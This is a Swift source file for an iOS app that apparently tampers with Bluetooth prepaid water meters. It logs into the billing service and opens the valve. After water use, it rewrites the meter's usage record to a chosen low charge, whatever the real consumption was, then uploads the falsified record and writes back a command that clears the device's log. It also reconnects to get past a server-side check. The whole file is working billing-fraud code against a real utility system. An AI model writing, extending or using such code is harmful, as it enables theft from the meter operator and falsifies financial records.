//
//  TamperView.swift
//  蓝牙水表工具 —— iOS 现场作业面板
//
//  功能与 Android 版一致：
//    登录 → 扫描/填 SN → 金额设置 → 开阀 → 用水 → 关阀（结算时按目标金额改写）
//
//  界面刻意保持精简：四个区块，从上到下走一遍即可。
//
import SwiftUI
import UIKit

@main
struct QzxyTamperApp: App {
    var body: some Scene {
        WindowGroup { TamperView() }
    }
}

struct TamperView: View {

    @StateObject private var ble = KlcxkjBleCentral()

    // ① 登录
    @State private var phone = ""
    @State private var password = ""
    @State private var account: QzxyAccount?
    @State private var loggingIn = false

    // ② 设备
    @State private var manualSN = ""
    @State private var deviceId = "833"
    @State private var bigTypeId = "4"
    @State private var smallTypeId = "57"
    @State private var proto = "20"

    // ③ 金额
    @State private var enabled = false
    @State private var useFixed = false
    @State private var fixedYuan = "0.06"
    @State private var minYuan = "0.10"
    @State private var maxYuan = "0.50"
    @State private var randomize = true

    // ④ 作业
    @State private var soakSeconds = 30
    @State private var busy = false
    @State private var status = "未连接"
    @State private var log = ""

    // ── 派生 ──
    private var effectiveSN: String {
        if !manualSN.isEmpty { return manualSN.uppercased().trimmingCharacters(in: .whitespaces) }
        return ble.devices.first(where: { $0.guessedSN != nil })?.guessedSN ?? ""
    }
    /// iOS 拿不到设备 MAC —— 实测 MAC = SN 按字节加冒号
    private var derivedMAC: String {
        let sn = effectiveSN
        guard sn.count == 12 else { return "" }
        return stride(from: 0, to: 12, by: 2).map { i -> String in
            let s = sn.index(sn.startIndex, offsetBy: i)
            return String(sn[s..<sn.index(s, offsetBy: 2)])
        }.joined(separator: ":")
    }

    var body: some View {
        NavigationView {
            ScrollView {
                VStack(alignment: .leading, spacing: 12) {

                    // ═══ ① 登录 ═══
                    Section(title: "① 登录") {
                        if let a = account {
                            Text("已登录：\(a.phone)")
                                .font(.custom("Menlo", size: 12)).foregroundColor(.green)
                            Text("userId=\(a.userId)  loginCode=\(a.loginCode.prefix(8))…")
                                .font(.custom("Menlo", size: 10)).foregroundColor(.secondary)
                            Button("退出登录") { account = nil }
                                .buttonStyle(.bordered).font(.caption)
                        } else {
                            HStack {
                                TextField("手机号", text: $phone)
                                    .textFieldStyle(.roundedBorder).keyboardType(.numberPad)
                                SecureField("密码", text: $password)
                                    .textFieldStyle(.roundedBorder)
                            }
                            Button(loggingIn ? "登录中…" : "登录") {
                                Task { await doLogin() }
                            }
                            .buttonStyle(.borderedProminent)
                            .disabled(loggingIn || phone.isEmpty || password.isEmpty)
                        }
                    }

                    // ═══ ② 设备 ═══
                    Section(title: "② 设备") {
                        HStack {
                            Button(ble.isScanning ? "停止扫描" : "扫描水表") {
                                ble.isScanning ? ble.stopScan() : ble.startScan()
                            }
                            .buttonStyle(.bordered)
                            Button("断开") { ble.disconnect() }
                                .buttonStyle(.bordered)
                        }
                        .font(.caption)

                        if !ble.devices.isEmpty {
                            Text("点一下填入：").font(.caption2).foregroundColor(.secondary)
                            ForEach(ble.devices) { d in
                                Button {
                                    if let sn = d.guessedSN { manualSN = sn }
                                } label: {
                                    Text("\(d.name)  \(d.guessedSN ?? "SN未识别")  \(d.rssi)dBm")
                                        .font(.custom("Menlo", size: 10))
                                }
                                .buttonStyle(.bordered)
                            }
                        }

                        TextField("SN（12 位，如 C47F0E2698C8）", text: $manualSN)
                            .textFieldStyle(.roundedBorder)
                            .autocapitalization(.allCharacters)
                            .font(.custom("Menlo", size: 12))

                        if !derivedMAC.isEmpty {
                            Text("推导 MAC = \(derivedMAC)")
                                .font(.custom("Menlo", size: 11)).foregroundColor(.green)
                        }

                        HStack {
                            TextField("deviceId", text: $deviceId).textFieldStyle(.roundedBorder)
                            TextField("bigTypeId", text: $bigTypeId).textFieldStyle(.roundedBorder)
                            TextField("smallTypeId", text: $smallTypeId).textFieldStyle(.roundedBorder)
                        }
                        .font(.custom("Menlo", size: 11))

                        Text("连接：\(ble.connState.text)")
                            .font(.caption).foregroundColor(ble.connState.color)
                    }

                    // ═══ ③ 金额 ═══
                    Section(title: "③ 金额（结算按此记账）") {
                        Toggle("启用控额", isOn: $enabled)
                            .onChange(of: enabled) { v in
                                say("控额 \(v ? "开启" : "关闭")")
                            }

                        if enabled {
                            Picker("方式", selection: $useFixed) {
                                Text("固定").tag(true)
                                Text("区间").tag(false)
                            }
                            .pickerStyle(.segmented)

                            if useFixed {
                                HStack {
                                    Text("固定 ¥").font(.caption)
                                    TextField("0.06", text: $fixedYuan)
                                        .textFieldStyle(.roundedBorder).keyboardType(.decimalPad)
                                }
                            } else {
                                HStack {
                                    Text("区间 ¥").font(.caption)
                                    TextField("0.10", text: $minYuan)
                                        .textFieldStyle(.roundedBorder).keyboardType(.decimalPad)
                                    Text("~").font(.caption)
                                    TextField("0.50", text: $maxYuan)
                                        .textFieldStyle(.roundedBorder).keyboardType(.decimalPad)
                                }
                                Toggle("区间内随机", isOn: $randomize).font(.caption)
                            }

                            Text("生效说明：不管实际用多少水，关阀结算时都按此金额上报")
                                .font(.caption2).foregroundColor(.orange)
                        } else {
                            Text("未启用 —— 结算按设备真实用量走")
                                .font(.caption2).foregroundColor(.secondary)
                        }
                    }

                    // ═══ ④ 作业 ═══
                    Section(title: "④ 作业") {
                        Stepper("用水 \(soakSeconds) 秒", value: $soakSeconds, in: 5...600, step: 5)
                            .font(.caption)

                        HStack {
                            Button("开阀") { Task { await doOpen() } }
                                .buttonStyle(.bordered).disabled(busy)
                            Button("关阀") { Task { await doClose() } }
                                .buttonStyle(.bordered).disabled(busy)
                            Button("★ 一键") { Task { await doFull() } }
                                .buttonStyle(.borderedProminent)
                                .disabled(busy || account == nil)
                        }
                        .font(.caption)

                        if busy { ProgressView() }

                        Text(status).font(.caption).foregroundColor(.blue)
                    }

                    // ═══ 日志 ═══
                    Section(title: "日志") {
                        HStack {
                            Button("清空") { log = "" }.font(.caption2)
                            Button("复制全部") {
                                UIPasteboard.general.string = log
                                say("日志已复制到剪贴板")
                            }.font(.caption2)
                        }
                        ScrollView {
                            Text(log.isEmpty ? "（暂无）" : log)
                                .font(.custom("Menlo", size: 9))
                                .frame(maxWidth: .infinity, alignment: .leading)
                        }
                        .frame(height: 240)
                    }
                }
                .padding()
            }
            .navigationTitle("蓝牙水表工具")
        }
        .navigationViewStyle(.stack)
    }

    // ══════════════════════════════════════════════
    //  工具
    // ══════════════════════════════════════════════

    private func say(_ s: String) {
        let f = DateFormatter()
        f.dateFormat = "HH:mm:ss"
        log += "[\(f.string(from: Date()))] \(s)\n"
        if log.count > 40000 { log = String(log.suffix(30000)) }
    }

    /// 把界面上的金额设置写进引擎
    private func pushAmountConfig() {
        XfDataTamper.enabled = enabled
        XfDataTamper.mode = enabled ? .target : .probe
        XfDataTamper.useFixed = useFixed
        XfDataTamper.fixedYuan = Double(fixedYuan) ?? 0.06
        XfDataTamper.minYuan = Double(minYuan) ?? 0.10
        XfDataTamper.maxYuan = Double(maxYuan) ?? 0.50
        XfDataTamper.randomize = randomize
    }

    // ══════════════════════════════════════════════
    //  动作
    // ══════════════════════════════════════════════

    private func doLogin() async {
        loggingIn = true
        defer { loggingIn = false }
        say("登录 \(phone) …")
        do {
            let a = try await QzxyApi.login(phone: phone, password: password)
            account = a
            say(a == nil ? "✗ 登录失败" : "✓ 登录成功 loginCode=\(a!.loginCode.prefix(12))…")
        } catch {
            say("✗ 登录异常：\(error.localizedDescription)")
        }
    }

    /// 连接（未连则连）
    private func ensureConnected() async -> Bool {
        if case .ready = ble.connState { return true }
        if !derivedMAC.isEmpty {
            // 有 SN：直接用推导出的 MAC 连（iOS 侧 CoreBluetooth 用 UUID 连，
            // 这里靠扫描结果；手输 SN 的情况需要先扫描到该设备）
        }
        guard let d = ble.devices.first else {
            say("✗ 请先扫描到设备（iOS 需要先扫描建立连接）")
            return false
        }
        let ok = await ble.connect(d)
        say(ok ? "✓ 已连接" : "✗ 连接失败")
        return ok
    }

    private func doOpen() async {
        guard let acc = account else { say("✗ 请先登录"); return }
        let mac = derivedMAC
        guard !mac.isEmpty else { say("✗ 请先填 SN（12 位）"); return }
        pushAmountConfig()

        busy = true; defer { busy = false }
        say("── 开阀 ──")

        guard await ensureConnected() else { return }
        guard let st = await ble.query() else { say("✗ 查状态失败"); return }
        status = "state=\(st.state) (\(st.stateName))"
        say("state=\(st.state)(\(st.stateName))  random=\(st.randomNumber)  proto=\(st.protocolType)")

        do {
            guard let data = try await QzxyApi.rateOrder(
                acc: acc, deviceId: deviceId, mac: mac,
                macType: QzxySigner.macType(Int(st.devType), Int(st.a1)),
                bigTypeId: bigTypeId, smallTypeId: smallTypeId,
                protocolType: st.protocolType, randomNumber: st.randomNumber
            ) else { say("✗ 取费率包失败"); return }

            guard let down = data["downData"] as? String, !down.isEmpty else {
                say("✗ 响应无 downData"); return
            }
            say("费率包 \(down.count / 2)B  rate=\(data["rate"] ?? "-")  预扣=\(data["preDeductMoney"] ?? "-")")

            guard let dr = BleFrameCodec.fromHex(down), await ble.writeRate(dr) else {
                say("✗ 开阀未确认"); return
            }
            say("★ 已开阀（真实出水）")
        } catch {
            say("✗ 异常：\(error.localizedDescription)")
        }
    }

    private func doClose() async {
        busy = true; defer { busy = false }
        say("── 关阀 ──")
        guard await ensureConnected() else { return }
        let ok = await ble.closeValve()
        say(ok ? "★ 已关阀" : "✗ 关阀未确认")
        if let st = await ble.query() { status = "state=\(st.state) (\(st.stateName))" }
    }

    /// 一键：开阀 → 用水 → 关阀（结算时按目标金额改写）→ 清记录
    private func doFull() async {
        guard let acc = account else { say("✗ 请先登录"); return }
        let mac = derivedMAC
        guard !mac.isEmpty else { say("✗ 请先填 SN（12 位）"); return }
        pushAmountConfig()

        busy = true; defer { busy = false }
        say("═══ 一键全流程 ═══")
        say("金额模式：\(XfDataTamper.describe())")

        // ① 连接 + 查状态
        guard await ensureConnected() else { return }
        guard let st = await ble.query() else { say("✗ 查状态失败"); return }
        status = "state=\(st.state)"
        say("state=\(st.state)(\(st.stateName))  random=\(st.randomNumber)")

        // ② 取费率包
        do {
            guard let data = try await QzxyApi.rateOrder(
                acc: acc, deviceId: deviceId, mac: mac,
                macType: QzxySigner.macType(Int(st.devType), Int(st.a1)),
                bigTypeId: bigTypeId, smallTypeId: smallTypeId,
                protocolType: st.protocolType, randomNumber: st.randomNumber
            ), let down = data["downData"] as? String, !down.isEmpty else {
                say("✗ 取费率包失败"); return
            }
            say("费率包 \(down.count / 2)B  rate=\(data["rate"] ?? "-")")

            // ③ 开阀
            guard let dr = BleFrameCodec.fromHex(down), await ble.writeRate(dr) else {
                say("✗ 开阀失败"); return
            }
            say("★ 已开阀（真实出水）")
        } catch {
            say("✗ 异常：\(error.localizedDescription)"); return
        }

        // ④ 用水
        say("用水 \(soakSeconds)s …")
        try? await Task.sleep(nanoseconds: UInt64(soakSeconds) * 1_000_000_000)

        // ⑤ 关阀 → 重连（同一连接采集会被服务端判 226）
        _ = await ble.closeValve()
        ble.disconnect()
        try? await Task.sleep(nanoseconds: 800_000_000)
        if let d = ble.devices.first { _ = await ble.connect(d) }
        _ = await ble.query()

        // ⑥ 采集
        guard let payload = await ble.collect() else { say("✗ 采集失败"); return }
        let real = BleFrameCodec.toHex(payload).lowercased()
        say("原始 xfData(\(payload.count)B)：\(real)")

        // ⑦ ★ 改写金额 + 上传
        var toUpload = real
        if let (frame, cents) = XfDataTamper.rewrite(real, targetYuan: XfDataTamper.pickTarget()) {
            toUpload = frame
            say("控额改写：\(cents) 厘（¥\(String(format: "%.2f", Double(cents) / 1000.0))）")
            say("改写后：\(frame)")
        } else if XfDataTamper.enabled {
            say("✗ 改写失败（区间/上限不符），按原值上传")
        }

        do {
            let resp = try await QzxyApi.uploadTampered(acc: acc, xfData: toUpload)
            say("上传 → \(resp.prefix(260))")

            // ⑧ 解 clData → 0x86 写回
            if let d = try? JSONSerialization.jsonObject(with: Data(resp.utf8)) as? [String: Any],
               let data = d["data"] as? [String: Any] {
                let upMoney = data["upMoney"] ?? "-"
                say("结算金额 upMoney=\(upMoney)")
                if let cl = data["clData"] as? String, !cl.isEmpty,
                   let (_, hex) = QzxyCrypto.clDataToWriteBack(cl),
                   let wb = BleFrameCodec.fromHex(hex) {
                    let ok = await ble.writeBack(wb)
                    say(ok ? "★ 0x86 写回成功，设备记录已清" : "✗ 写回未确认")
                } else {
                    say("! 响应无 clData")
                }
            }
        } catch {
            say("✗ 上传异常：\(error.localizedDescription)")
        }

        if let st2 = await ble.query() {
            status = "state=\(st2.state)"
            say("结算后 state=\(st2.state)（0=空闲=记录已清）")
        }
        say("═══ 结束 ═══")
    }
}

// ══════════════════════════════════════════════════════════
//  复用组件
// ══════════════════════════════════════════════════════════

private struct Section<Content: View>: View {
    let title: String
    @ViewBuilder let content: () -> Content
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text(title).font(.headline).foregroundColor(.blue)
            content()
        }
        .padding(10)
        .frame(maxWidth: .infinity, alignment: .leading)
        .background(Color.secondary.opacity(0.08))
        .cornerRadius(10)
    }
}

extension BleConnectionState {
    var text: String {
        switch self {
        case .idle: return "未连接"
        case .connecting: return "连接中…"
        case .ready: return "就绪"
        case .failed(let e): return "失败：\(e)"
        }
    }
    var color: Color {
        switch self {
        case .ready: return .green
        case .connecting: return .orange
        case .failed: return .red
        case .idle: return .secondary
        }
    }
}
